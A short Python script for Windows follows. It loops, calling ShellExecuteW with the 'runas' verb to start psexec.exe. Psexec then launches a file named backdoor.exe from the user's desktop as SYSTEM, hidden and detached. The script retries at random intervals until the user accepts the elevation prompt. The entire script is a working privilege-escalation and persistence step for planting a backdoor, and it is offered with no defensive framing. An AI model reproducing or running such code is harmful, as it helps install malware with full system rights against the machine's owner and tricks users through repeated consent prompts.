import ctypes, time, random

while True: #1
    retorno = ctypes.windll.shell32.ShellExecuteW(None, u"runas", u"psexec.exe",
u"-accepteula -nobanner -s -d C:\\Users\\usuario\\Desktop\\backdoor.exe", None, 0)
    if retorno == 42: #2
        break
    time.sleep(random.randint(1,11)) #3